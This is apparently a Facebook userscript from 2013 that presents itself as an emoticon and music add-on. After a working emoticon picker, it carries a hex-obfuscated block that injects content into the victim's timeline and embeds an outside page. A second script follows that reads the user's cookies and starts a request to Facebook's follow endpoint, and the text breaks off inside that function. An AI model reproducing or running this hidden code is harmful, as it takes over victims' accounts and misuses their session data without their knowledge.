// ==UserScripts==
// @name    	Emotione Music on FB *UPDATE* 24/08/2013
// @namespace	Emotione Music on FB
// @description	Emotione on Facebook
// @version 	1.1
// @author  	Nhat Anh
// @include 	http://www.facebook.com/*
// @include 	https://www.facebook.com/*
// ==/UserScript==
(function(){function n(e){var t=document.createElement("div");t.innerHTML=e;return t.firstChild}function r(e){var t=document.createElement("div");var n=document.createTextNode(e);t.appendChild(n);return t.innerHTML}function i(e){return e instanceof HTMLInputElement&&e.type=="text"||e instanceof HTMLTextAreaElement}function s(e){return e.className=="openToggler"}function o(e,t){if(t===undefined){t=!s(e)}if(t){e.className="openToggler"}else{e.removeAttribute("class")}}function u(e,t){var r;r='<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';r+='<div class="jewelFlyout">';r+="</div>";r+="</li>";var i=n(r);e.appendChild(i);r='<div style="display: none;">';r+="</div>";var s=n(r);t.appendChild(s);(function(e){i.addEventListener("click",function(){var t=this.parentNode.childNodes;for(var n=0;n<t.length;n++){if(t[n]===this){}else{t[n].style.background="";t[n].firstChild.style.color=""}}var r=e.parentNode.childNodes;for(var i=0;i<r.length;i++){if(r[i]===e){e.style.display=""}else{r[i].style.display="none"}}})})(s);return{title:i.firstChild,body:s}}function a(e,s){var o;o='<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';o+='<div style="padding: 10px; width: 200px; font-size: 15px;">';o+="</div>";o+="</div>";var u=n(o).firstChild;for(var a=0;a<e.length;a++){var f=e[a];if(!s(f)){continue}o='<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';o+="<a";o+=' class="emoticon'+(f.class!==undefined?" "+f.class:"")+'"';o+=' style="text-decoration: inherit; color: inherit;'+(f.class!==undefined?" color: transparent;":" width: auto;")+'"';o+=f.name!==undefined?' title="'+f.name+'"':"";o+=">";o+=r(f.chars);o+="</a>";o+="</span>";var l=n(o);u.appendChild(l);var c=l.firstChild;(function(e){c.addEventListener("click",function(){if(i(t)){t.focus();var n=e.chars;var r=t.value;var s=t.selectionStart;var o=t.selectionEnd;t.value=r.substring(0,s)+n+r.substring(o);t.setSelectionRange(s+n.length,s+n.length)}openFlyoutCommand=false})})(f)}return u.parentNode}if(!document.querySelector("#pageNav")){return}var e=[{chars:" :) ","class":"emoticon_smile",name:"Cười"},{chars:" :( ","class":"emoticon_frown",name:"Mếu"},{chars:" :P ","class":"emoticon_tongue",name:"Lè Lưỡi"},{chars:" =D ","class":"emoticon_grin",name:"Cười Hở Răng"},{chars:" :o ","class":"emoticon_gasp",name:"Không"},{chars:" ;) ","class":"emoticon_wink",name:"Nháy Mắt"},{chars:" :v ","class":"emoticon_pacman",name:"Pacman"},{chars:" >:( ","class":"emoticon_grumpy",name:"Gruñón"},{chars:" :/ ","class":"emoticon_unsure",name:"Inseguro"},{chars:" :'( ","class":"emoticon_cry",name:"Llorando"},{chars:" ^_^ ","class":"emoticon_kiki",name:"Kiki"},{chars:" 8) ","class":"emoticon_glasses",name:"Lentes"},{chars:" B| ","class":"emoticon_sunglasses",name:"Gafas de sol"},{chars:" <3 ","class":"emoticon_heart",name:"Corazón"},{chars:" 3:) ","class":"emoticon_devil",name:"Demonio"},{chars:" O:) ","class":"emoticon_angel",name:"Ángel"},{chars:" -_- ","class":"emoticon_squint",name:"Bizco"},{chars:" o.O ","class":"emoticon_confused",name:"Confundido"},{chars:" >:o ","class":"emoticon_upset",name:"Alterado"},{chars:" :3 ","class":"emoticon_colonthree",name:"Dudando"},{chars:" (y) ","class":"emoticon_like",name:"Me gusta"},{chars:" :* ","class":"emoticon emoticon_kiss",name:"Beso"},{chars:" (^^^) ","class":"emoticon_shark",name:"Tiburón"},{chars:" :|] ","class":"emoticon_robot",name:"Robot"},{chars:' <(") ',"class":"emoticon_penguin",name:"Pingüino"},{chars:" :poop: ","class":"emoticon_poop",name:"Mierda"},{chars:" :putnam: ","class":"emoticon_putnam",name:"Putman"},{chars:" 🌂 ","class":"_1az _1a- _2c0",name:"Sombrilla cerrada"},{chars:" 🌊 ","class":"_1az _1a- _2c1",name:"Ola de mar"},{chars:" 🌙 ","class":"_1az _1a- _2c2",name:"Luna cuarto creciente"},{chars:" 🌟 ","class":"_1az _1a- _2c3",name:"Estrella brillante"},{chars:" 🌱 ","class":"_1az _1a- _2c4",name:"Semillero"},{chars:" 🌴 ","class":"_1az _1a- _2c5",name:"Mata de palma"},{chars:" 🌵 ","class":"_1az _1a- _2c6",name:"Captus"},{chars:" 🌷 ","class":"_1az _1a- _2c7",name:"Tulipán"},{chars:" 🌸 ","class":"_1az _1a- _2c8",name:"Flor de cereza"},{chars:" 🌹 ","class":"_1az _1a- _2c9",name:"Rosa"},{chars:" 🌺 ","class":"_1az _1a- _2ca",name:"Cayena"},{chars:" 🌻 ","class":"_1az _1a- _2cb",name:"Girasol"},{chars:" 🌾 ","class":"_1az _1a- _2cc",name:"Espiga de arroz"},{chars:" 🍀 ","class":"_1az _1a- _2cd",name:"Trébol de cuatro hojas"},{chars:" 🍁 ","class":"_1az _1a- _2ce",name:"Hoja de arce"},{chars:" 🍂 ","class":"_1az _1a- _2cf",name:"Hoja caída"},{chars:" 🍃 ","class":"_1az _1a- _2cg",name:"Hoja flotando en el viento"},{chars:" 🍊 ","class":"_1az _1a- _2ch",name:"Mandarina"},{chars:" 🍎 ","class":"_1az _1a- _2ci",name:"Manzana roja"},{chars:" 🍓 ","class":"_1az _1a- _2cj",name:"Fresa"},{chars:" 🍔 ","class":"_1az _1a- _2ck",name:"Hamburguesa"},{chars:" 🍸 ","class":"_1az _1a- _2cl",name:"Copa de cóctel"},{chars:" 🍺 ","class":"_1az _1a- _2cm",name:"Jarra de cerveza"},{chars:" 🎁 ","class":"_1az _1a- _2cn",name:"Regalo envuelto"},{chars:" 🎃 ","class":"_1az _1a- _2co",name:"Calabaza con vela"},{chars:" 🎄 ","class":"_1az _1a- _2cp",name:"Árbol de navidad"},{chars:" 🎅 ","class":"_1az _1a- _2cq",name:"Padre en navidad"},{chars:" 🎈 ","class":"_1az _1a- _2cr",name:"Globo"},{chars:" 🎉 ","class":"_1az _1a- _2cs",name:"Corchete de fiesta"},{chars:" 🎍 ","class":"_1az _1a- _2ct",name:"Pino de decoración"},{chars:" 🎎 ","class":"_1az _1a- _2cu",name:"Muñecas japonesas"},{chars:" 🎏 ","class":"_1az _1a- _2cv",name:"Serpentina de carpas"},{chars:" 🎐 ","class":"_1az _1a- _2cw",name:"Carrillón de viento"},{chars:" 🎓 ","class":"_1az _1a- _2cx",name:"Gorro de graduación"},{chars:" 🎵 ","class":"_1az _1a- _2cy",name:"Nota musical"},{chars:" 🎶 ","class":"_1az _1a- _2cz",name:"Múltiples notas musicales"},{chars:" 🎼 ","class":"_1az _1a- _2c-",name:"Partitura musical"},{chars:" 🐍 ","class":"_1az _1a- _2c_",name:"Serpiente"},{chars:" 🐎 ","class":"_1az _1a- _2d0",name:"Caballo"},{chars:" 🐑 ","class":"_1az _1a- _2d1",name:"Oveja"},{chars:" 🐶 ","class":"_1az _1a- _491",name:"Perro"},{chars:" 🐒 ","class":"_1az _1a- _2d2",name:"Mono"},{chars:" 🐔 ","class":"_1az _1a- _2d3",name:"Gallina"},{chars:" 🐗 ","class":"_1az _1a- _2d4",name:"Jabalí"},{chars:" 🐘 ","class":"_1az _1a- _2d5",name:"Elefante"},{chars:" 🐙 ","class":"_1az _1a- _2d6",name:"Pulpo"},{chars:" 🐚 ","class":"_1az _1a- _2d7",name:"Concha de caracol"},{chars:" 🐛 ","class":"_1az _1a- _2d8",name:"Insecto"},{chars:" 🐟 ","class":"_1az _1a- _2d9",name:"Pez"},{chars:" 🐠 ","class":"_1az _1a- _2da",name:"Pez tropical"},{chars:" 🐡 ","class":"_1az _1a- _2db",name:"Pez globo"},{chars:" 🐥 ","class":"_1az _1a- _2dc",name:"Pollito de frente"},{chars:" 🐦 ","class":"_1az _1a- _2dd",name:"Ave"},{chars:" 🐧 ","class":"_1az _1a- _2de",name:"Pingüino"},{chars:" 🐨 ","class":"_1az _1a- _2df",name:"Koala"},{chars:" 🐩 ","class":"_1az _1a- _2dg",name:"Perro de lanas"},{chars:" 🐫 ","class":"_1az _1a- _2dh",name:"Camello bactriano"},{chars:" 🐬 ","class":"_1az _1a- _2di",name:"Delfín"},{chars:" 🐭 ","class":"_1az _1a- _2dj",name:"Cara de ratón"},{chars:" 🐮 ","class":"_1az _1a- _2dk",name:"Cara de vaca"},{chars:" 🐯 ","class":"_1az _1a- _2dl",name:"Cara de tigre"},{chars:" 🐰 ","class":"_1az _1a- _2dm",name:"Cara de conejo"},{chars:" 🐱 ","class":"_1az _1a- _2dn",name:"Cara de gato"},{chars:" 🐳 ","class":"_1az _1a- _2do",name:"Ballena escupiendo agua"},{chars:" 🐴 ","class":"_1az _1a- _2dp",name:"Cara de caballo"},{chars:" 🐵 ","class":"_1az _1a- _2dq",name:"Cara de mono"},{chars:" 🐷 ","class":"_1az _1a- _2dr",name:"Cara de cerdo"},{chars:" 🐸 ","class":"_1az _1a- _2ds",name:"Cara de rana"},{chars:" 🐹 ","class":"_1az _1a- _2dt",name:"Cara de hamster"},{chars:" 🐺 ","class":"_1az _1a- _2du",name:"Cara de lobo"},{chars:" 🐻 ","class":"_1az _1a- _2dv",name:"Cara de oso"},{chars:" 🐾 ","class":"_1az _1a- _2dw",name:"Huellas"},{chars:" 👀 ","class":"_1az _1a- _2dx",name:"Ojos"},{chars:" 👂 ","class":"_1az _1a- _2dy",name:"Oreja"},{chars:" 👃 ","class":"_1az _1a- _2dz",name:"Nariz"},{chars:" 👄 ","class":"_1az _1a- _2d-",name:"Boca"},{chars:" 👅 ","class":"_1az _1a- _2d_",name:"Lengua"},{chars:" 👆 ","class":"_1az _1a- _2e0",name:"Mano blanca indicando hacia arriba"},{chars:" 👇 ","class":"_1az _1a- _2e1",name:"Mano blanca indicando hacia abajo"},{chars:" 👈 ","class":"_1az _1a- _2e2",name:"Mano blanca indicando hacia la izquierda"},{chars:" 👉 ","class":"_1az _1a- _2e3",name:"Mano blanca indicando hacia la derecha"},{chars:" 👊 ","class":"_1az _1a- _2e4",name:"Puño"},{chars:" 👋 ","class":"_1az _1a- _2e5",name:"Mano en movimiento"},{chars:" 👌 ","class":"_1az _1a- _2e6",name:"Mano indicando todo bien"},{chars:" 👍 ","class":"_1az _1a- _2e7",name:"Mano con pulgar arriba"},{chars:" 👎 ","class":"_1az _1a- _2e8",name:"Mano con pulgar abajo"},{chars:" 👏 ","class":"_1az _1a- _2e9",name:"Manos aplaudiendo"},{chars:" 👐 ","class":"_1az _1a- _2ea",name:"Manos abiertas"},{chars:" 👦 ","class":"_1az _1a- _2eb",name:"Chico"},{chars:" 👧 ","class":"_1az _1a- _2ec",name:"Chica"},{chars:" 👨 ","class":"_1az _1a- _2ed",name:"Hombre"},{chars:" 👩 ","class":"_1az _1a- _2ee",name:"Mujer"},{chars:" 👫 ","class":"_1az _1a- _2ef",name:"Hombre y mujer agarrados de las manos"},{chars:" 👮 ","class":"_1az _1a- _2eg",name:"Oficial de policía"},{chars:" 👯 ","class":"_1az _1a- _2eh",name:"Mujer con orejas de conejo"},{chars:" 👱 ","class":"_1az _1a- _2ei",name:"Persona con pelo rubio"},{chars:" 👲 ","class":"_1az _1a- _2ej",name:"Hombre con gua pi mao"},{chars:" 👳 ","class":"_1az _1a- _2ek",name:"Hombre con turbante"},{chars:" 👴 ","class":"_1az _1a- _2el",name:"Hombre viejo"},{chars:" 👵 ","class":"_1az _1a- _2em",name:"Mujer vieja"},{chars:" 👶 ","class":"_1az _1a- _2en",name:"Bebé"},{chars:" 👷 ","class":"_1az _1a- _2eo",name:"Trabajador de construcción"},{chars:" 👸 ","class":"_1az _1a- _2ep",name:"Princesa"},{chars:" 👻 ","class":"_1az _1a- _2eq",name:"Fantasma"},{chars:" 👼 ","class":"_1az _1a- _2er",name:"Ángel bebé"},{chars:" 👽 ","class":"_1az _1a- _2es",name:"Extraterrestre"},{chars:" 👾 ","class":"_1az _1a- _2et",name:"Monstruo Extraterrestre"},{chars:" 👿 ","class":"_1az _1a- _2eu",name:"Diablillo"},{chars:" 💀 ","class":"_1az _1a- _2ev",name:"Cráneo"},{chars:" 💂 ","class":"_1az _1a- _2ew",name:"Guardia"},{chars:" 💃 ","class":"_1az _1a- _2ex",name:"Bailarina"},{chars:" 💅 ","class":"_1az _1a- _2ey",name:"Esmalte de uñas"},{chars:" 💋 ","class":"_1az _1a- _2ez",name:"Marca de beso"},{chars:" 💏 ","class":"_1az _1a- _2e-",name:"Beso pareja"},{chars:" 💐 ","class":"_1az _1a- _2e_",name:"Ramo de flores"},{chars:" 💑 ","class":"_1az _1a- _2f0",name:"Pareja con corazón"},{chars:" 💓 ","class":"_1az _1a- _2f1",name:"Corazón latiendo"},{chars:" 💔 ","class":"_1az _1a- _2f2",name:"Corazón roto"},{chars:" 💖 ","class":"_1az _1a- _2f3",name:"Corazón brillante"},{chars:" 💗 ","class":"_1az _1a- _2f4",name:"Corazón creciente"},{chars:" 💘 ","class":"_1az _1a- _2f5",name:"Corazón con flecha"},{chars:" 💙 ","class":"_1az _1a- _2f6",name:"Corazón azul"},{chars:" 💚 ","class":"_1az _1a- _2f7",name:"Corazón verde"},{chars:" 💛 ","class":"_1az _1a- _2f8",name:"Corazón amarillo"},{chars:" 💜 ","class":"_1az _1a- _2f9",name:"Corazón morado"},{chars:" 💝 ","class":"_1az _1a- _2fa",name:"Corazón con lazo"},{chars:" 💢 ","class":"_1az _1a- _2fb",name:"Símbolo de enojo"},{chars:" 💤 ","class":"_1az _1a- _2fc",name:"Durmiendo"},{chars:" 💦 ","class":"_1az _1a- _2fd",name:"Símbolo de gotas de sudor"},{chars:" 💨 ","class":"_1az _1a- _2fe",name:"Símbolo de arranque rápido"},{chars:" 💩 ","class":"_1az _1a- _2ff",name:"Pila de cacá"},{chars:" 💪 ","class":"_1az _1a- _2fg",name:"Bícep flexionado"},{chars:" 💻 ","class":"_1az _1a- _2fh",name:"Computadora personal"},{chars:" 💽 ","class":"_1az _1a- _2fi",name:"Minidisco"},{chars:" 💾 ","class":"_1az _1a- _2fj",name:"Disco flexible"},{chars:" 💿 ","class":"_1az _1a- _2fk",name:"Disco óptico"},{chars:" 📀 ","class":"_1az _1a- _2fl",name:"DVD"},{chars:" 📞 ","class":"_1az _1a- _2fm",name:"Receptor de teléfono"},{chars:" 📠 ","class":"_1az _1a- _2fn",name:"Fax"},{chars:" 📱 ","class":"_1az _1a- _2fo",name:"Teléfono móvil"},{chars:" 📲 ","class":"_1az _1a- _2fp",name:"Teléfono móvil con flecha de izquierda a derecha"},{chars:" 📺 ","class":"_1az _1a- _2fq",name:"Televisión"},{chars:" 🔔 ","class":"_1az _1a- _2fr",name:"Campana"},{chars:" 😁 ","class":"_1az _1a- _2fs",name:"Cara de mueca con ojos sonrientes"},{chars:" 😂 ","class":"_1az _1a- _2ft",name:"Cara con lágrimas de alegría"},{chars:" 😃 ","class":"_1az _1a- _2fu",name:"Cara sonriente con boca abierta"},{chars:" 😄 ","class":"_1az _1a- _2fv",name:"Cara y ojos sonrientes con boca abierta"},{chars:" 😆 ","class":"_1az _1a- _2fw",name:"Cara sonriente con boca abierta y ojos bien cerrados"},{chars:" 😉 ","class":"_1az _1a- _2fx",name:"Cara guiñando ojo"},{chars:" 😋 ","class":"_1az _1a- _2fy",name:"Cara saboreando una comida deliciosa"},{chars:" 😌 ","class":"_1az _1a- _2fz",name:"Cara de alivio"},{chars:" 😍 ","class":"_1az _1a- _2f-",name:"Cara sonriente con ojos en forma de corazón"},{chars:" 😏 ","class":"_1az _1a- _2f_",name:"Cara de sonrisa burlona"},{chars:" 😒 ","class":"_1az _1a- _2g0",name:"Cara de aburrimiento"},{chars:" 😓 ","class":"_1az _1a- _2g1",name:"Cara con sudor frio"},{chars:" 😔 ","class":"_1az _1a- _2g2",name:"Cara pensativa"},{chars:" 😖 ","class":"_1az _1a- _2g3",name:"Cara de confundido"},{chars:" 😘 ","class":"_1az _1a- _2g4",name:"Cara arrojando beso"},{chars:" 😚 ","class":"_1az _1a- _2g5",name:"Cara besando con ojos cerrados"},{chars:" 😜 ","class":"_1az _1a- _2g6",name:"Cara con lengua afuera y guiñando un ojo"},{chars:" 😝 ","class":"_1az _1a- _2g7",name:"Cara con lengua afuera y ojos muy cerrados"},{chars:" 😞 ","class":"_1az _1a- _2g8",name:"Cara desanimada"},{chars:" 😠 ","class":"_1az _1a- _2g9",name:"Cara de enojo"},{chars:" 😡 ","class":"_1az _1a- _2ga",name:"Cara de mucho enojo"},{chars:" 😢 ","class":"_1az _1a- _2gb",name:"Cara llorando"},{chars:" 😣 ","class":"_1az _1a- _2gc",name:"Cara de perseverancia"},{chars:" 😤 ","class":"_1az _1a- _2gd",name:"Cara de triunfo"},{chars:" 😥 ","class":"_1az _1a- _2ge",name:"Cara desanimada pero aliviada"},{chars:" 😨 ","class":"_1az _1a- _2gf",name:"Cara de miedoso"},{chars:" 😩 ","class":"_1az _1a- _2gg",name:"Cara de fatigado"},{chars:" 😪 ","class":"_1az _1a- _2gh",name:"Cara de dormido"},{chars:" 😫 ","class":"_1az _1a- _2gi",name:"Cara de cansado"},{chars:" 😭 ","class":"_1az _1a- _2gj",name:"Cara gritando"},{chars:" 😰 ","class":"_1az _1a- _2gk",name:"Cara con boca abierta y sudor frio"},{chars:" 😱 ","class":"_1az _1a- _2gl",name:"Cara aterrada de miedo"},{chars:" 😲 ","class":"_1az _1a- _2gm",name:"Cara de muy sorprendido"},{chars:" 😳 ","class":"_1az _1a- _2gn",name:"Cara sonrojada"},{chars:" 😵 ","class":"_1az _1a- _2go",name:"Cara mareada"},{chars:" 😷 ","class":"_1az _1a- _2gp",name:"Cara con mascarilla médica"},{chars:" 😸 ","class":"_1az _1a- _2gq",name:"Cara de gato haciendo muecas y ojos cerrados"},{chars:" 😹 ","class":"_1az _1a- _2gr",name:"Cara de gato con lágrimas de risa"},{chars:" 😺 ","class":"_1az _1a- _2gs",name:"Cara de gato sonriente con boca abierta"},{chars:" 😻 ","class":"_1az _1a- _2gt",name:"Cara de gato sonriente con corazones en los ojos"},{chars:" 😼 ","class":"_1az _1a- _2gu",name:"Cara de gato con sonrisa torcida"},{chars:" 😽 ","class":"_1az _1a- _2gv",name:"Cara de gato besando con ojos cerrados"},{chars:" 😿 ","class":"_1az _1a- _2gw",name:"Cara de gato llorando"},{chars:" 🙀 ","class":"_1az _1a- _2gx",name:"Cara de gato aterrada de miedo"},{chars:" 🙋 ","class":"_1az _1a- _2gy",name:"Persona feliz levantando una mano"},{chars:" 🙌 ","class":"_1az _1a- _2gz",name:"Persona levantando ambas manos en celebración"},{chars:" 🙍 ","class":"_1az _1a- _2g-",name:"Persona frunciendo el ceño"},{chars:" 🙏 ","class":"_1az _1a- _2g_",name:"Persona en plegaria"},{chars:" ☝ ","class":"_1az _1a- _2h0",name:"Dedo índice señalando hacia arriba"},{chars:" ☺ ","class":"_1az _1a- _2h1",name:"Cara blanca sonriendo"},{chars:" ⚡ ","class":"_1az _1a- _2h2",name:"Símbolo de alto voltaje"},{chars:" ⛄ ","class":"_1az _1a- _2h3",name:"Muñeco de nieve sin nieve"},{chars:" ✊ ","class":"_1az _1a- _2h4",name:"Puño hacia arriba"},{chars:" ✋ ","class":"_1az _1a- _2h5",name:"Mano hacia arriba"},{chars:" ✌ ","class":"_1az _1a- _2h6",name:"Mano de victoria"},{chars:" ☀ ","class":"_1az _1a- _2h7",name:"Sol con rayos solares"},{chars:" ☁ ","class":"_1az _1a- _2h8",name:"Nube"},{chars:" ☔ ","class":"_1az _1a- _2h9",name:"Sombrilla con gotas de lluvia"},{chars:" ☕ ","class":"_1az _1a- _2ha",name:"Bebida caliente"},{chars:" ✨ ","class":"_1az _1a- _2hb",name:"Brillo"},{chars:" ❤ ","class":"_1az _1a- _2hc",name:"Corazón negro pesado"}];var t=document.activeElement;var f;f='<li class="navItem middleItem notifNegativeBase">';f+='<div class="fbJewel">';f+='<a class="navLink" title=" Icon Facebook New">';f+='<span class="emoticon emoticon_smile" style="vertical-align: middle;"></span>';f+='<span class="headerTinymanName"> Icon Facebook New</span>';f+="</a>";f+="</a>";f+="<div>";f+='<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';f+='<div class="jewelBeeperHeader">';f+='<div class="beeperNubWrapper">';f+='<div class="beeperNub" style="left: 4px;"></div>';f+="</div>";f+="</div>";f+='<div class="uiHeader uiHeaderBottomBorder jewelHeader">';f+='<div class="clearfix uiHeaderTop">';f+='<div class="rfloat">';f+='<h3 class="accessible_elem">Emoticones on FB</h3>';f+='<div class="uiHeaderActions fsm fwn fcg">';f+='<a href="https://www.facebook.com/haivcl" target="_blank" class="">Like</a> • <a href=" https://www.facebook.com/djnhatanhidol/posts/177862539062823" target="_blank" class="">Comment</a>';f+="</div>";f+="</div>";f+='<div><h3 class="uiHeaderTitle" aria-hidden="true">Emoticones on FB</h3></div>';f+="</div>";f+="</div>";f+='<ul style="display: table; width: 100%; text-align: center;">';f+="</ul>";f+="<div>";f+="</div>";f+='<div class="jewelFooter">';f+='<a class="jewelFooter" href="https://www.facebook.com/djnhatanhidol" target="_blank">Admin</a>';f+="</div>";f+="</div>";f+="</div>";f+="</div>";f+="</li>";var l=n(f);var c=document.querySelector("#pageNav");c.insertBefore(l,c.firstChild);l.addEventListener("click",function(){if(i(t)){t.focus()}openFlyoutCommand=undefined},true);var h=l.firstChild.firstChild;var p=h.nextSibling;var d=p.firstChild.childNodes[1];var v=d.nextSibling;h.addEventListener("click",function(){openFlyoutCommand=!s(p)});var m=u(d,v);m.title.click();m.body.appendChild(a(e,function(e){if(e.class===undefined){return false}return true}));document.addEventListener("click",function(){t=document.activeElement;if(openFlyoutCommand!==undefined){o(p,openFlyoutCommand)}openFlyoutCommand=false})})()
var _0xb5f1=["\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x61\x62\x6F\x75\x74\x5F\x75\x6E\x69\x74","\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x3C\x73\x74\x79\x6C\x65\x3D\x22\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x20\x63\x65\x6E\x74\x65\x72\x3B\x22\x3D\x22\x22\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64\x2D\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x66\x66\x66\x66\x66\x66\x3B\x20\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x63\x30\x63\x30\x63\x30\x3B\x22\x3E\x26\x6E\x62\x73\x70\x3B\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x73\x74\x79\x6C\x65\x3D\x22\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x3E\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x69\x72\x73\x74\x49\x74\x65\x6D\x20\x75\x69\x42\x75\x74\x74\x6F\x6E\x47\x72\x6F\x75\x70\x49\x74\x65\x6D\x20\x62\x75\x74\x74\x6F\x6E\x49\x74\x65\x6D\x22\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x75\x69\x42\x75\x74\x74\x6F\x6E\x20\x75\x69\x42\x75\x74\x74\x6F\x6E\x4F\x76\x65\x72\x6C\x61\x79\x20\x75\x69\x42\x75\x74\x74\x6F\x6E\x4C\x61\x72\x67\x65\x22\x20\x68\x72\x65\x66\x3D\x22\x2F\x6D\x65\x73\x73\x61\x67\x65\x73\x2F\x6E\x68\x61\x74\x2E\x6B\x6F\x72\x65\x61\x22\x20\x72\x6F\x6C\x65\x3D\x22\x62\x75\x74\x74\x6F\x6E\x22\x20\x61\x6A\x61\x78\x69\x66\x79\x3D\x22\x2F\x61\x6A\x61\x78\x2F\x6D\x65\x73\x73\x61\x67\x69\x6E\x67\x2F\x63\x6F\x6D\x70\x6F\x73\x65\x72\x2E\x70\x68\x70\x3F\x69\x64\x73\x25\x35\x42\x30\x25\x35\x44\x3D\x31\x30\x30\x30\x30\x34\x30\x34\x39\x38\x36\x39\x37\x31\x33\x26\x61\x6D\x70\x3B\x72\x65\x66\x3D\x74\x69\x6D\x65\x6C\x69\x6E\x65\x22\x20\x72\x65\x6C\x3D\x22\x64\x69\x61\x6C\x6F\x67\x22\x20\x69\x64\x3D\x22\x75\x5F\x30\x5F\x73\x22\x20\x74\x61\x62\x69\x6E\x64\x65\x78\x3D\x22\x30\x22\x3E\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x75\x69\x42\x75\x74\x74\x6F\x6E\x54\x65\x78\x74\x22\x3E\x54\x68\x61\x79\x20\u0110\u1ED5\x69\x20\x42\xE0\x69\x20\x48\xE1\x74\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x61\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20","\x3C\x65\x6D\x62\x65\x64\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x68\x61\x74\x6B\x6F\x72\x65\x61\x2E\x66\x6F\x72\x75\x6D\x30\x2E\x6E\x65\x74\x2F\x68\x33\x32\x2D\x70\x61\x67\x65\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x33\x32\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x35\x30\x22\x20\x2F\x3E","\x43\x6F\x64\x65\x20\x4D\x75\x73\x69\x63\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x42\u1EA3\x6E\x20\x51\x75\x79\u1EC1\x6E\x20\x53\x74\x61\x72\x20\x4E\x68\u1EAD\x74\x2E\x20\x43\x68\xFA\x63\x20\x43\xE1\x63\x20\x42\u1EA1\x6E\x20\x43\x68\u01A1\x69\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x56\x75\x69\x20\x56\u1EBB","\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x72\x6F\x66\x69\x6C\x65\x2F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x2F\x61\x70\x70\x5F\x69\x63\x6F\x6E\x73\x2F\x6D\x75\x73\x69\x63\x5F\x31\x36\x2E\x70\x6E\x67\x22\x20\x61\x6C\x74\x3D\x22\x22\x3E\x26\x6E\x62\x73\x70\x3B\x20\x3C\x73\x74\x72\x6F\x6E\x67\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x38\x30\x38\x30\x38\x30\x3B\x22\x3E\x4D\x75\x73\x69\x63\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x62\x79\x3C\x2F\x73\x70\x61\x6E\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x6E\x68\x61\x74\x2E\x6B\x6F\x72\x65\x61\x22\x3E\x53\x74\x61\x72\x20\x4E\x68\u1EAD\x74\x3C\x2F\x61\x3E\x3C\x2F\x70\x3E\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x3C\x2F\x73\x74\x79\x6C\x65\x3D\x22\x74\x65\x78\x74\x2D\x61\x6C\x69\x67\x6E\x3A\x3E\x20\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20"];$(_0xb5f1[1])[_0xb5f1[0]]+=_0xb5f1[2];$(_0xb5f1[1])[_0xb5f1[0]]+=_0xb5f1[3];alert(_0xb5f1[4]);$(_0xb5f1[1])[_0xb5f1[0]]+=_0xb5f1[5];

// ==UserScript==
// @name            Emotione Music on FB *UPDATE* 24/08/2013
// @description     Emotione Music on FB
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

function cereziAl(e){var t=e+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n="/ajax/follow/follow_profile.php?__a=1";var 